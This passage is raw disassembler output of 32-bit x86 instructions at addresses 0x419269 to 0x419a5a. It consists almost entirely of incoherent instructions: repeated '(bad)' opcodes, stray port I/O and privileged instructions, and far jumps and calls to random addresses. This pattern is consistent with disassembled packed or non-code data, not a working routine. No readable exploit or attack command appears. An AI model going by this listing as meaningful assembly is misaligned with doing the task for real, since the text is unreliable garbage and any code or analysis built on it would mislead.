  419269:	push   ds
  41926a:	add    BYTE PTR [edi-0x3815c239],cl
  419270:	shr    BYTE PTR [esp+edx*2],0x9c
  419274:	test   al,0xaf
  419276:	and    dh,0xf4
  419279:	or     al,0x16
  41927b:	out    dx,eax
  41927c:	sub    BYTE PTR [esi+0x76],bl
  41927f:	lds    esi,FWORD PTR [ecx]
  419281:	sbb    BYTE PTR [ebp+0x4dfe17e],ch
  419287:	inc    eax
  419288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419289:	fisubr DWORD PTR [ecx-0xe]
  41928c:	das    
  41928d:	cmp    esp,edi
  41928f:	inc    eax
  419290:	mov    ecx,0xcbb76cd9
  419295:	int    0x9c
  419297:	adc    eax,0x6e3ae000
  41929c:	mov    cl,0x80
  41929e:	and    DWORD PTR [edi+0x2b],edi
  4192a1:	xchg   edx,eax
  4192a2:	std    
  4192a3:	add    eax,0x242e6c71
  4192a8:	mov    ebp,0x70cab83a
  4192ad:	daa    
  4192ae:	pop    es
  4192af:	out    0xe3,eax
  4192b1:	neg    DWORD PTR [eax+ebp*2+0x5afcebef]
  4192b8:	cmc    
  4192b9:	adc    eax,0x81351926
  4192be:	inc    ecx
  4192bf:	shr    ebp,1
  4192c1:	(bad)  
  4192c2:	in     al,0x31
  4192c4:	jmp    0x93ff:0x6e32fb0
  4192cb:	shr    BYTE PTR [ebx],0x43
  4192ce:	std    
  4192cf:	pop    edi
  4192d0:	or     BYTE PTR ds:0x58dd1187,bl
  4192d6:	loop   0x41929f
  4192d8:	jl     0x4192a7
  4192da:	mov    gs,WORD PTR [edi+0x590a8d9]
  4192e0:	jmp    0x419321
  4192e2:	cli    
  4192e3:	add    BYTE PTR [edx+0x58ad9f73],bh
  4192e9:	pop    es
  4192ea:	in     al,0xf
  4192ec:	jmp    0x4192fa
  4192ee:	outs   dx,DWORD PTR ds:[esi]
  4192ef:	retf   
  4192f0:	push   esi
  4192f1:	mov    eax,0xedd7930
  4192f6:	jnp    0x419340
  4192f8:	mov    eax,ds:0xd7c1b7b1
  4192fd:	leave  
  4192fe:	or     bl,cl
  419300:	and    DWORD PTR [eax-0x60e21a19],ebp
  419306:	push   esp
  419307:	aaa    
  419308:	adc    BYTE PTR [ebp-0x3],dl
  41930b:	mov    dl,0xcf
  41930d:	xchg   esi,eax
  41930e:	jnp    0x4192b9
  419310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419311:	int3   
  419312:	jmp    0xe4303ce1
  419317:	icebp  
  419318:	jnp    0x41930e
  41931a:	pushf  
  41931b:	adc    dh,BYTE PTR es:[esp+eax*1-0x54]
  419320:	xor    DWORD PTR [ecx+0xd58c5bc],esp
  419326:	mov    edx,esp
  419328:	paddusb mm1,QWORD PTR [ecx+edx*8-0x20]
  41932d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41932e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41932f:	adc    ebp,DWORD PTR [ebx+0x65]
  419332:	mov    edx,0xfd1aa467
  419337:	jmp    0x116b6ba7
  41933c:	loop   0x4192c8
  41933e:	mov    bl,0xc8
  419340:	cmc    
  419341:	mov    ebp,edi
  419343:	xor    DWORD PTR [ebx-0x149973d9],ecx
  419349:	bndldx bnd0,[edi]
  41934c:	movq   QWORD PTR [ebx-0x7a787e50],mm2
  419353:	cdq    
  419354:	pop    edi
  419355:	fbstp  TBYTE PTR [edx+edx*8]
  419358:	cmp    ch,BYTE PTR [ecx-0x70]
  41935b:	sub    eax,0xb2fd31f5
  419360:	mov    ds:0xc4b77091,al
  419365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419366:	cdq    
  419367:	enter  0x9458,0xfe
  41936b:	jae    0x419368
  41936d:	adc    al,0x27
  41936f:	int3   
  419370:	jmp    0x419365
  419372:	(bad)  
  419373:	cvttps2pi mm0,QWORD PTR [esi]
  419376:	mov    ds:0xbcdfb3c0,al
  41937b:	jae    0x419350
  41937d:	pusha  
  41937e:	xchg   ecx,eax
  41937f:	or     al,0x1b
  419381:	sub    eax,0x45011e04
  419386:	mov    esp,0x4d527bca
  41938b:	int3   
  41938c:	pop    eax
  41938d:	mov    ecx,0xeb4fc8d3
  419392:	data16 je 0x41940c
  419395:	loop   0x4193c9
  419397:	mov    BYTE PTR [ecx+ecx*1],ah
  41939a:	mov    bh,BYTE PTR [ebp+0x5b]
  41939d:	dec    esi
  41939e:	and    esp,ebp
  4193a0:	mov    bl,0x7e
  4193a2:	mov    edx,0xf92247bb
  4193a7:	rcl    DWORD PTR [ecx],cl
  4193a9:	outs   dx,BYTE PTR ds:[esi]
  4193aa:	mov    ebp,0xe2f69d3f
  4193af:	(bad)  
  4193b0:	sbb    al,0x76
  4193b2:	test   BYTE PTR [ecx+edi*8-0x1404537f],bl
  4193b9:	ror    cl,0x80
  4193bc:	sbb    esi,DWORD PTR [edi-0x20a1f999]
  4193c2:	adc    eax,0xadc25bcd
  4193c7:	repz aas 
  4193c9:	int    0xfc
  4193cb:	jbe    0x41938d
  4193cd:	xchg   ebp,eax
  4193ce:	add    DWORD PTR [ecx-0x49],esi
  4193d1:	push   es
  4193d2:	adc    al,0xb7
  4193d4:	cmp    edx,edx
  4193d6:	mov    esp,0xf4f908c8
  4193db:	out    0xb5,al
  4193dd:	mov    ebp,edi
  4193df:	cld    
  4193e0:	loopne 0x4193c5
  4193e2:	push   ds
  4193e3:	adc    DWORD PTR [edi],ecx
  4193e5:	mov    edx,0xab35c7e0
  4193ea:	jl     0x41937c
  4193ec:	jle    0x4193a7
  4193ee:	icebp  
  4193ef:	xchg   ecx,eax
  4193f0:	jmp    0x419426
  4193f2:	shl    BYTE PTR [edx],0x85
  4193f5:	sti    
  4193f6:	mov    BYTE PTR [ebx+0x7c14df94],bh
  4193fc:	mov    ds:0xbcaf7ec0,eax
  419401:	push   ds
  419402:	rep ins DWORD PTR es:[edi],dx
  419404:	mov    ds:0xe8c7ef07,al
  419409:	fild   DWORD PTR [edi-0x14]
  41940c:	xor    eax,0x66d4c8d4
  419411:	fnstcw WORD PTR [esp+eax*4-0x32]
  419415:	lahf   
  419416:	ins    DWORD PTR es:[edi],dx
  419417:	pop    edx
  419418:	jmp    0x52b8:0x47077893
  41941f:	push   ecx
  419420:	mov    eax,ds:0xc4ad9513
  419425:	fistp  QWORD PTR [ecx+0x72]
  419428:	ins    BYTE PTR es:[edi],dx
  419429:	xor    eax,0xa43fbc84
  41942e:	cld    
  41942f:	jecxz  0x4193e9
  419431:	dec    ecx
  419432:	and    ebx,ecx
  419434:	clc    
  419435:	pushf  
  419436:	mov    esp,0xc7db9bc8
  41943b:	lock aaa 
  41943d:	inc    esp
  41943e:	mov    al,ds:0x91aeeb3c
  419443:	std    
  419444:	pop    eax
  419445:	push   es
  419446:	inc    ebp
  419447:	push   ds
  419448:	xlat   BYTE PTR ds:[ebx]
  419449:	fdivr  st,st(2)
  41944b:	jb     0x4193d1
  41944d:	pop    ebx
  41944e:	sbb    eax,0xde2697da
  419453:	pop    esi
  419454:	jmp    0x4193ef
  419456:	in     eax,dx
  419457:	les    ebx,FWORD PTR [ecx-0x31]
  41945a:	cwde   
  41945b:	out    0x71,eax
  41945d:	fistp  QWORD PTR [ecx]
  41945f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419460:	ss daa 
  419462:	stos   DWORD PTR es:[edi],eax
  419463:	(bad)  
  419464:	sub    ebp,DWORD PTR [edi+0x28fc4afd]
  41946a:	fistp  QWORD PTR [ebp+0x21]
  41946d:	xor    ebp,ebx
  41946f:	pop    eax
  419470:	ins    DWORD PTR es:[edi],dx
  419471:	call   0xa0e1789a
  419476:	mov    eax,0xc84ee22c
  41947b:	je     0x41942c
  41947d:	xor    esp,DWORD PTR [ecx-0x532e14a6]
  419483:	mov    ebp,0xd357614e
  419488:	fcmovnu st,st(7)
  41948a:	test   DWORD PTR gs:[edx-0x2060d9a7],ebp
  419491:	icebp  
  419492:	cld    
  419493:	mov    esi,0x545f6c89
  419498:	fwait
  419499:	addr16 in eax,0xc7
  41949c:	mov    ebp,0x2a08fb46
  4194a1:	sub    DWORD PTR [edx-0x7ee7145b],esp
  4194a7:	inc    ecx
  4194a8:	mov    al,0x21
  4194aa:	jge    0x419459
  4194ac:	retf   0xbedf
  4194af:	mov    al,0x67
  4194b1:	rcr    BYTE PTR ds:0x64b3facc,cl
  4194b7:	clc    
  4194b8:	jmp    0x41950e
  4194ba:	rcr    DWORD PTR [ebp+0x1550788e],1
  4194c0:	mov    ch,0xd2
  4194c2:	popf   
  4194c3:	mov    esi,0x47f7f428
  4194c8:	push   edx
  4194c9:	push   ebp
  4194ca:	ret    
  4194cb:	aad    0x20
  4194cd:	mov    ah,0xfc
  4194cf:	add    DWORD PTR [ecx-0x6b7a9b90],edi
  4194d5:	add    DWORD PTR [edx-0x35],esp
  4194d8:	xchg   ebp,eax
  4194d9:	out    dx,al
  4194da:	sbb    cl,BYTE PTR ds:0x228ce6a1
  4194e0:	mov    BYTE PTR [edx],dl
  4194e2:	std    
  4194e3:	jbe    0x419510
  4194e5:	mov    ds:0xd47c4283,al
  4194ea:	aaa    
  4194eb:	leave  
  4194ec:	sub    eax,0xb7f72eaa
  4194f1:	jnp    0x419493
  4194f3:	hlt    
  4194f4:	xor    eax,0xf26fcc5
  4194f9:	add    edi,DWORD PTR [esi-0x9d42113]
  4194ff:	(bad)  
  419500:	and    al,0x39
  419502:	mov    al,0xa9
  419504:	lea    ebx,[edi-0x182edc07]
  41950a:	add    ecx,DWORD PTR [ebx+0x42fc957f]
  419510:	push   ebp
  419511:	lea    ebx,[ecx-0xa]
  419514:	loope  0x4194f5
  419516:	mov    ebx,0x9a086fb4
  41951b:	sub    al,0xa2
  41951d:	or     ebp,edi
  41951f:	repnz push ecx
  419521:	scas   eax,DWORD PTR es:[edi]
  419522:	dec    edi
  419523:	mov    dh,0x1d
  419525:	pop    ds
  419526:	dec    ecx
  419527:	enter  0x618f,0x60
  41952b:	dec    edx
  41952c:	mov    eax,0xeb590c1c
  419531:	push   edx
  419532:	mov    ebx,0xf2cd208b
  419537:	fld    TBYTE PTR [edi+ebx*8+0x5b2bbe84]
  41953e:	cmp    al,0xe
  419540:	mov    bh,cl
  419542:	stos   BYTE PTR es:[edi],al
  419543:	int3   
  419544:	hlt    
  419545:	or     eax,0xdf562f56
  41954a:	sub    eax,DWORD PTR [eax-0x25]
  41954d:	cmc    
  41954e:	stc    
  41954f:	(bad)  
  419550:	mov    ecx,DWORD PTR [edx]
  419552:	push   eax
  419553:	aam    0x5a
  419555:	sub    al,0x63
  419557:	(bad)  
  419558:	jmp    0x4195a6
  41955a:	aas    
  41955b:	xchg   edx,eax
  41955c:	loope  0x4194f8
  41955e:	pop    esp
  41955f:	call   0x11f8:0x8596e0a3
  419566:	sub    BYTE PTR [eax],bh
  419568:	pop    esp
  419569:	sub    bh,BYTE PTR [ecx-0x28]
  41956c:	jmp    0x419577
  41956e:	(bad)  
  41956f:	je     0x419501
  419571:	dec    esp
  419572:	mov    ebx,DWORD PTR [eax-0x10]
  419575:	add    eax,0x866e13ba
  41957a:	das    
  41957b:	or     eax,0xeb50ffab
  419580:	mov    DWORD PTR [ebx-0x3],ebp
  419583:	inc    edi
  419584:	push   ebx
  419585:	inc    esp
  419586:	sbb    edi,edi
  419588:	hlt    
  419589:	sbb    al,0x37
  41958b:	enter  0xbad3,0x1d
  41958f:	pop    es
  419590:	xor    dh,dl
  419592:	rol    BYTE PTR [ecx+0x18fe92eb],cl
  419598:	inc    ecx
  419599:	cmp    eax,DWORD PTR [eax]
  41959b:	fstp   DWORD PTR [ebp+0x3d586adf]
  4195a1:	jmp    0xcea11421
  4195a6:	cld    
  4195a7:	js     0x419529
  4195a9:	push   es
  4195aa:	pop    edi
  4195ab:	in     al,0x3f
  4195ad:	es jmp 0x63ee087b
  4195b3:	push   esp
  4195b4:	add    al,0x92
  4195b6:	jne    0x4195d4
  4195b8:	dec    edi
  4195b9:	ss in  al,0x68
  4195bc:	and    bl,dh
  4195be:	inc    esp
  4195bf:	ror    BYTE PTR [ebx-0x73],1
  4195c2:	repz fidivr WORD PTR [edi]
  4195c5:	xor    eax,0xdd1bc410
  4195ca:	in     al,dx
  4195cb:	fld    TBYTE PTR [eax+0x1f]
  4195ce:	out    0x6e,al
  4195d0:	mov    ch,0xca
  4195d2:	cld    
  4195d3:	add    DWORD PTR [eax-0xf],edi
  4195d6:	dec    esp
  4195d7:	dec    eax
  4195d8:	inc    ebp
  4195d9:	repnz outs dx,BYTE PTR ds:[esi]
  4195db:	fidiv  WORD PTR [eax-0x3654031c]
  4195e1:	xchg   esi,eax
  4195e2:	jns    0x41961c
  4195e4:	idiv   DWORD PTR [esi]
  4195e6:	std    
  4195e7:	call   0x88011e27
  4195ec:	fsubr  QWORD PTR [ebp+0x30]
  4195ef:	into   
  4195f0:	pop    ds
  4195f1:	mov    DWORD PTR [esi-0x12],ebx
  4195f4:	retf   
  4195f5:	lods   al,BYTE PTR ds:[esi]
  4195f6:	sub    DWORD PTR [esi+ecx*1],esi
  4195f9:	and    dl,ah
  4195fb:	(bad)  
  4195fc:	js     0x41965d
  4195fe:	mov    eax,DWORD PTR cs:[ebp-0x546e8b3]
  419605:	loopne 0x4195e9
  419607:	ret    0x1683
  41960a:	retf   
  41960b:	call   0x31ec8d65
  419610:	jmp    0x4195c3
  419612:	div    bh
  419614:	sub    ebx,ebp
  419616:	scas   eax,DWORD PTR es:[edi]
  419617:	mov    dh,0x33
  419619:	fisttp QWORD PTR [ebx-0x50]
  41961c:	xor    ah,cl
  41961e:	ficom  WORD PTR [esi-0x5ec78cf5]
  419624:	fidiv  WORD PTR [ebx]
  419626:	pop    edx
  419627:	mov    esi,0x3c7cee2d
  41962c:	ins    BYTE PTR es:[edi],dx
  41962d:	mov    dl,dl
  41962f:	inc    ebp
  419630:	and    eax,0xffffff86
  419633:	mov    al,ds:0xc8aec02e
  419638:	mov    dh,0x9c
  41963a:	ja     0x419639
  41963c:	std    
  41963d:	mov    eax,0x2125f118
  419642:	push   ebp
  419643:	test   al,0xc3
  419645:	fisttp WORD PTR [edx+0x4b6e595c]
  41964b:	(bad)  
  41964c:	cmp    eax,0x26bafd43
  419651:	(bad)  
  419652:	(bad)  [ebx-0x8]
  419655:	aaa    
  419656:	add    eax,ecx
  419658:	dec    edx
  419659:	jbe    0x419699
  41965b:	xchg   BYTE PTR [edi+eax*4],dl
  41965e:	inc    ecx
  41965f:	sub    eax,0xc71d27dd
  419664:	xlat   BYTE PTR ds:[ebx]
  419665:	mov    ds:0x788bced0,al
  41966a:	cdq    
  41966b:	xchg   edi,eax
  41966c:	pop    esp
  41966d:	push   ebx
  41966e:	test   eax,ecx
  419670:	mul    BYTE PTR [ebp+0x44c8d22c]
  419676:	lds    edi,FWORD PTR [ecx-0x15]
  419679:	mov    ch,0x26
  41967b:	push   ebx
  41967c:	jns    0x41961f
  41967e:	xchg   esi,eax
  41967f:	inc    esi
  419680:	retf   0xffdf
  419683:	mov    eax,0xce0cf471
  419688:	mov    bl,0xe1
  41968a:	add    dl,BYTE PTR [ebx]
  41968c:	dec    ecx
  41968d:	std    
  41968e:	cld    
  41968f:	fisttp WORD PTR [ebx-0x7b]
  419692:	enter  0x93f2,0xe0
  419696:	in     eax,0xef
  419698:	scas   eax,DWORD PTR es:[edi]
  419699:	aaa    
  41969a:	or     BYTE PTR [edi+0x5763cfca],0x73
  4196a1:	mov    ebx,0xe4eb237d
  4196a6:	retf   
  4196a7:	push   edx
  4196a8:	and    ebx,0xffffff8a
  4196ab:	in     al,0x7d
  4196ad:	push   es
  4196ae:	rol    DWORD PTR [ebp-0x12],0x6
  4196b2:	push   ss
  4196b3:	xchg   edx,eax
  4196b4:	mov    BYTE PTR [edx+0x294448af],al
  4196ba:	aad    0xb1
  4196bc:	out    0x90,al
  4196be:	fwait
  4196bf:	cmp    DWORD PTR [edx-0x5f1b32d1],ebp
  4196c5:	into   
  4196c6:	ror    eax,0x61
  4196c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196ca:	out    dx,eax
  4196cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196cc:	sbb    eax,0x767687d
  4196d1:	cmp    eax,0xffffffc4
  4196d4:	cld    
  4196d5:	jbe    0x4196f8
  4196d7:	enter  0x8baf,0xd9
  4196db:	gs rcr edi,cl
  4196de:	mov    al,ds:0x114e18c
  4196e3:	mov    ah,0xb
  4196e5:	(bad)  
  4196e6:	cld    
  4196e7:	cmp    ah,BYTE PTR [edx-0x59afea63]
  4196ed:	xor    dl,dl
  4196ef:	cdq    
  4196f0:	sub    eax,0x66d96edf
  4196f5:	push   ebp
  4196f6:	fstp   DWORD PTR [esi+0x7f]
  4196f9:	cld    
  4196fa:	std    
  4196fb:	test   DWORD PTR [ecx+ebp*4+0x3e],ebx
  4196ff:	setne  BYTE PTR [edi*2+0x53769d80]
  419707:	mov    esp,0xf5fcde34
  41970c:	or     BYTE PTR [ecx],bh
  41970e:	mov    ebp,0x4417c90a
  419713:	enter  0x4349,0x94
  419717:	cmp    BYTE PTR [edi-0x78],dl
  41971a:	jb     0x419782
  41971c:	call   FWORD PTR [ecx-0x2c]
  41971f:	mov    ch,0x69
  419721:	aaa    
  419722:	aas    
  419723:	es repnz aas 
  419726:	shrd   DWORD PTR [edi+ebx*8-0x42da8fc1],esi,cl
  41972e:	out    dx,eax
  41972f:	sbb    BYTE PTR [ebx-0x3b],dh
  419732:	cld    
  419733:	enter  0xe3e2,0x8c
  419737:	test   BYTE PTR [esi+0x54],0xf8
  41973b:	fidivr WORD PTR [ebx]
  41973d:	cmp    bh,ch
  41973f:	jns    0x4196d3
  419741:	cmp    esp,edi
  419743:	aas    
  419744:	sti    
  419745:	js     0x41973b
  419747:	aad    0xa6
  419749:	shl    BYTE PTR [edi-0x627b6898],1
  41974f:	push   ss
  419750:	(bad)  
  419752:	out    dx,eax
  419753:	(bad)  
  419755:	dec    esi
  419756:	cld    
  419757:	and    DWORD PTR [eax+0x38],eax
  41975a:	std    
  41975b:	ret    0xb765
  41975e:	loope  0x41972e
  419760:	(bad)  
  419761:	in     eax,0xee
  419763:	les    edx,FWORD PTR [edx]
  419765:	dec    esp
  419766:	imul   esp,DWORD PTR [esi+ebx*1],0xfec982df
  41976d:	retf   
  41976e:	rcl    ecx,cl
  419770:	loope  0x419707
  419772:	pop    esi
  419773:	dec    eax
  419774:	inc    ebx
  419775:	nop
  419776:	push   es
  419777:	ret    0xc070
  41977a:	sbb    eax,ecx
  41977c:	rcl    DWORD PTR [edi+edi*8-0x2c],cl
  419780:	imul   esi,ecx,0xd9eb0b81
  419786:	mov    ch,0x88
  419788:	out    0x9,eax
  41978a:	fwait
  41978b:	or     eax,0xc7a3df56
  419790:	pop    eax
  419791:	cmp    al,0x83
  419793:	fdivr  st,st(3)
  419795:	push   ds
  419796:	std    
  419797:	xchg   edx,eax
  419798:	mov    esp,0x3fb9fe5d
  41979d:	add    esi,edx
  41979f:	(bad)  
  4197a0:	mov    ah,0x26
  4197a2:	fadd   st,st(3)
  4197a4:	cli    
  4197a5:	xchg   edx,eax
  4197a6:	add    al,0xb
  4197a8:	jmp    0x4197de
  4197aa:	mov    ds:0x75a77a7,eax
  4197af:	dec    edx
  4197b0:	test   bh,bl
  4197b2:	scas   al,BYTE PTR es:[edi]
  4197b3:	cmp    eax,0xeeae431f
  4197b8:	call   0x21fe:0x2a8dfd40
  4197bf:	mov    esp,0xbbe3fbb9
  4197c4:	out    dx,al
  4197c5:	adc    dl,BYTE PTR [esi+0x48]
  4197c8:	add    BYTE PTR [ecx+0x715da360],dl
  4197ce:	std    
  4197cf:	shl    bl,1
  4197d1:	ret    0xd3fa
  4197d4:	enter  0xcdfc,0xc8
  4197d8:	aas    
  4197d9:	stos   DWORD PTR es:[edi],eax
  4197da:	lea    ebp,[esi]
  4197dc:	cli    
  4197dd:	je     0x4197e7
  4197df:	aas    
  4197e0:	call   0x9a13:0x6f8bfd1f
  4197e7:	fisttp DWORD PTR [edi+0x308b3ce]
  4197ed:	mov    edi,0x70fb204f
  4197f2:	std    
  4197f3:	jg     0x41978b
  4197f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197f6:	jns    0x419786
  4197f8:	xchg   edx,eax
  4197f9:	pushf  
  4197fa:	enter  0x5bc8,0xc4
  4197fe:	sub    BYTE PTR [ebp+0x75],bl
  419801:	stos   DWORD PTR es:[edi],eax
  419802:	fidiv  WORD PTR [edx]
  419804:	jmp    0x4197e0
  419806:	jae    0x419854
  419808:	not    BYTE PTR [ecx]
  41980a:	push   cs
  41980b:	js     0x41983d
  41980d:	fucomip st,st(3)
  41980f:	rcr    edx,0x80
  419812:	cs mov edi,0xe0fced16
  419818:	push   esi
  419819:	sbb    BYTE PTR [ebp+0x7e],ch
  41981c:	hlt    
  41981d:	sub    esi,DWORD PTR ds:0xd93836c8
  419823:	push   eax
  419824:	add    al,0x6a
  419826:	cwde   
  419827:	out    dx,al
  419828:	jmp    0x4197e0
  41982a:	dec    ebp
  41982b:	test   BYTE PTR [edx],0x42
  41982e:	test   eax,0x9d98b43
  419833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419834:	xchg   ebp,eax
  419835:	int    0x40
  419837:	enter  0x179d,0x8f
  41983b:	neg    DWORD PTR ds:0x94b7fca6
  419841:	dec    esi
  419842:	lds    edi,FWORD PTR [esi-0x381dbee0]
  419848:	xor    DWORD PTR [esi+0x17],esp
  41984b:	ins    BYTE PTR es:[edi],dx
  41984c:	scas   eax,DWORD PTR es:[edi]
  41984d:	out    0x3c,eax
  41984f:	pop    ds
  419850:	jmp    0x419816
  419852:	cmp    BYTE PTR [esi-0x33],ch
  419855:	or     DWORD PTR [eax-0x302029a0],eax
  41985b:	arpl   WORD PTR [eax],ax
  41985d:	mov    dh,0xb1
  41985f:	in     al,0xaa
  419861:	sbb    edi,ebp
  419863:	enter  0x3d57,0x4f
  419867:	jo     0x419815
  419869:	sti    
  41986a:	lahf   
  41986b:	loopne 0x419891
  41986d:	push   es
  41986e:	jge    0x4198d2
  419870:	inc    eax
  419871:	inc    ebx
  419872:	cmp    DWORD PTR [ecx+0x12],ebx
  419875:	aad    0xf5
  419877:	add    DWORD PTR [ecx+ebx*2-0x32],0x1a72dfc8
  41987f:	pop    ebp
  419880:	enter  0x36e2,0x39
  419884:	add    ah,BYTE PTR [esi]
  419886:	sbb    eax,0xfc4fc708
  41988b:	xor    ah,ch
  41988d:	sub    eax,DWORD PTR [eax+0x20]
  419890:	push   ebp
  419891:	inc    esp
  419892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419893:	mov    dl,BYTE PTR [edi]
  419895:	leave  
  419896:	xchg   cl,cl
  419898:	mov    BYTE PTR [edx],al
  41989a:	mov    ebx,0xba085a82
  41989f:	adc    al,0x7e
  4198a1:	sub    al,0xfd
  4198a3:	cmp    ebx,esp
  4198a5:	lds    esi,FWORD PTR ds:0xf9c914e2
  4198ab:	mov    esi,0xa10326a9
  4198b0:	jmp    0x41988f
  4198b2:	fwait
  4198b3:	mov    WORD PTR [ecx+0x22],es
  4198b6:	cld    
  4198b7:	inc    ecx
  4198b8:	scas   eax,DWORD PTR es:[edi]
  4198b9:	jmp    FWORD PTR [edx+0x6e9c51c8]
  4198bf:	sub    ecx,DWORD PTR [ebp-0x6b65e26f]
  4198c5:	fistp  QWORD PTR [edx+0x7207c44e]
  4198cb:	lds    esi,FWORD PTR [edx+0x3cc9fcb0]
  4198d1:	pop    DWORD PTR [esi]
  4198d3:	or     DWORD PTR [edi-0x54],0x7d
  4198d7:	enter  0x7d18,0x84
  4198db:	jno    0x419881
  4198dd:	cmp    DWORD PTR [edx],0xffffff94
  4198e0:	in     al,dx
  4198e1:	popa   
  4198e2:	movd   mm2,DWORD PTR [esi-0x746ab7f4]
  4198e9:	cli    
  4198ea:	sahf   
  4198eb:	pushf  
  4198ec:	fs call 0x2a9ef864
  4198f2:	stos   DWORD PTR es:[edi],eax
  4198f3:	mov    BYTE PTR [ebp+0x2c],dl
  4198f6:	(bad)  
  4198f7:	(bad)  
  4198f8:	sub    esp,DWORD PTR [esi-0x3]
  4198fb:	fild   DWORD PTR [edi-0x68]
  4198fe:	xchg   ecx,eax
  4198ff:	int    0x94
  419901:	xor    eax,0x1026c83f
  419906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419907:	xchg   edi,eax
  419908:	loop   0x41989a
  41990a:	test   BYTE PTR [edx],al
  41990c:	jmp    0x419901
  41990e:	or     bl,BYTE PTR [eax]
  419910:	mov    ah,0xf9
  419912:	and    dl,dh
  419914:	(bad)  
  419915:	jmp    0x41997e
  419917:	invd   
  419919:	(bad)  
  41991b:	mov    cl,cl
  41991d:	push   es
  41991e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41991f:	sbb    al,0xe5
  419921:	ins    BYTE PTR es:[edi],dx
  419922:	jg     0x419935
  419924:	mov    eax,ds:0xbbc7e54e
  419929:	adc    bh,BYTE PTR [esi+0x685ffbef]
  41992f:	cs out dx,al
  419931:	dec    edi
  419932:	cmp    DWORD PTR [edx-0x76caa03a],eax
  419938:	and    ebp,DWORD PTR [eax]
  41993a:	(bad)
  41993e:	push   edi
  41993f:	fwait
  419940:	popa   
  419941:	add    ah,0x9
  419944:	lds    esi,FWORD PTR [ecx-0x13]
  419947:	or     al,0xcb
  419949:	fistp  WORD PTR [edi]
  41994b:	inc    esp
  41994c:	loope  0x41998f
  41994e:	in     eax,dx
  41994f:	cmp    al,0x74
  419951:	data16 std 
  419953:	imul   ebx,DWORD PTR [esi-0x2fdf9c5f],0x47c80df0
  41995d:	leave  
  41995e:	jg     0x41998a
  419960:	mov    ds,WORD PTR [edx+0x4dcdd694]
  419966:	stos   BYTE PTR es:[edi],al
  419967:	inc    ebx
  419968:	jmp    0x4199e8
  41996a:	daa    
  41996b:	push   ds
  41996c:	scas   eax,DWORD PTR es:[edi]
  41996d:	popa   
  41996e:	mov    bl,0xc9
  419970:	bound  ebx,QWORD PTR [edx-0x4c]
  419973:	dec    ecx
  419974:	add    bl,BYTE PTR [eax]
  419976:	xor    eax,DWORD PTR [edx+eiz*4]
  419979:	cmc    
  41997a:	add    edx,ecx
  41997c:	sbb    cl,bh
  41997e:	push   cs
  41997f:	imul   ebx
  419981:	and    BYTE PTR [edx+0x32590c70],0x26
  419988:	repnz fistp QWORD PTR ds:0xa3a3f06e
  41998f:	minps  xmm2,XMMWORD PTR [ebp+edi*8-0x11]
  419994:	sti    
  419995:	mov    ebp,0x5b6321e2
  41999a:	pop    eax
  41999b:	enter  0x3c3d,0x72
  41999f:	aaa    
  4199a0:	jge    0x419a00
  4199a2:	jp     0x4199bc
  4199a4:	jmp    0x4199e1
  4199a6:	add    edx,DWORD PTR [ebx]
  4199a8:	xchg   esp,eax
  4199a9:	stc    
  4199aa:	mov    DWORD PTR ds:[ebx],0x1dbfbde0
  4199b1:	lds    ecx,FWORD PTR [edi+0x67]
  4199b4:	mov    ds,WORD PTR ds:0xe33504fd
  4199ba:	adc    eax,0x27d1c56f
  4199bf:	mov    edi,0xb94a6ff
  4199c4:	data16 adc bh,al
  4199c7:	sub    al,0x44
  4199c9:	ins    BYTE PTR es:[edi],dx
  4199ca:	loope  0x4199db
  4199cc:	add    dh,ah
  4199ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199cf:	add    ah,dh
  4199d1:	imul   edi,DWORD PTR [ebx+0x7aa47dda],0x6b
  4199d8:	gs (bad) 
  4199db:	sub    ah,BYTE PTR [edx+0xb776adc]
  4199e1:	icebp  
  4199e2:	repz rcr BYTE PTR [esi-0x66],0x95
  4199e7:	sbb    al,0xab
  4199e9:	xor    DWORD PTR [edx+ebp*2-0x3753c0fe],edi
  4199f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199f1:	fwait
  4199f2:	mov    esp,0x3c2fc790
  4199f7:	sbb    eax,0x9e65abeb
  4199fc:	pop    esi
  4199fd:	scas   eax,DWORD PTR es:[edi]
  4199fe:	outs   dx,DWORD PTR ds:[esi]
  4199ff:	and    edi,esp
  419a01:	call   0x9ff7db95
  419a06:	xor    BYTE PTR ds:0x79a22f86,cl
  419a0c:	jmp    0x4199d1
  419a0e:	ja     0x419a5e
  419a10:	add    dl,cl
  419a12:	aas    
  419a13:	pop    esi
  419a14:	repnz add eax,0xa8ebe10d
  419a1a:	sbb    al,0x69
  419a1c:	js     0x419a4d
  419a1e:	sbb    BYTE PTR [edx],ch
  419a20:	loop   0x4199d0
  419a22:	outs   dx,DWORD PTR ds:[esi]
  419a23:	aaa    
  419a24:	(bad)  [ecx-0x3]
  419a27:	stos   BYTE PTR es:[edi],al
  419a28:	xlat   BYTE PTR ds:[ebx]
  419a29:	(bad)  
  419a2a:	into   
  419a2b:	push   ss
  419a2c:	int    0x3f
  419a2e:	pop    ebx
  419a2f:	enter  0x5968,0xf0
  419a33:	out    dx,eax
  419a34:	cmp    ebx,DWORD PTR [ecx]
  419a36:	sti    
  419a37:	retf   0xd2e6
  419a3a:	lds    ebp,FWORD PTR [eax-0x3572ae02]
  419a40:	imul   ebx,DWORD PTR [ebx-0x5f],0xb14acbc8
  419a47:	push   edi
  419a48:	xor    BYTE PTR [ebx+eiz*2+0x5d],dl
  419a4c:	std    
  419a4d:	sub    al,ah
  419a4f:	cmp    ebp,DWORD PTR [ebx]
  419a51:	enter  0x8979,0xe4
  419a55:	push   ds
  419a56:	rol    edi,1
  419a58:	push   ebx
  419a59:	push   ss
  419a5a:	in     eax,0x74
